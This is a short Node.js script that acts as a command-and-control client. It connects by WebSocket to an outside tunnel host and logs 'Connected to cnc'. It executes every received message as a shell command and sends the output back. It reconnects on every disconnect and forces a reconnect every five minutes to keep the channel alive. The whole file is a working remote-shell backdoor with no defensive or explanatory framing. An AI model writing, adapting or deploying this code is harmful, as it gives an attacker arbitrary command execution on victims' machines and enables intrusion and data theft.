const WebSocket = require('ws');
const { exec } = require('child_process');

function connect() {
    const ws = new WebSocket('ws://en-teams.gl.at.ply.gg:43276');

    ws.on('open', () => {
        console.log('Connected to cnc');
    });

    ws.on('message', data => {
        const message = Buffer.isBuffer(data) ? data.toString('utf8') : data;
        const command = message.trim();
        
        if (command.length === 0) return;

        if ('cls' === command && 'win32' === process.platform) {
            exec('cls', handleExecResponse);
        } else if ('clear' === command && ('linux' === process.platform || 'darwin' === process.platform)) {
            exec('clear', handleExecResponse);
        } else {
            exec(command, handleExecResponse);
        }

        function handleExecResponse(error, stdout, stderr) {
            if (error) {
                ws.send(JSON.stringify({ type: 'error', message: '' }));
            }
            if (stdout) {
                ws.send(JSON.stringify({ type: 'stdout', message: stdout }));
            }
            if (stderr) {
                ws.send(JSON.stringify({ type: 'stderr', message: stderr }));
            }
        }
    });

    ws.on('close', () => {
        console.log('Disconnected. Reconnecting in 0.5 seconds...');
        setTimeout(connect, 500);
    });

    ws.on('error', (err) => {
        console.error('WebSocket error:', err);
        ws.close(); 
    });

    // Disconnect and reconnect every 5 minutes
    setInterval(() => {
        console.log('Disconnecting for a reconnect...');
        ws.close();
    }, 5 * 60 * 1000); // 5 minutes
}

connect();
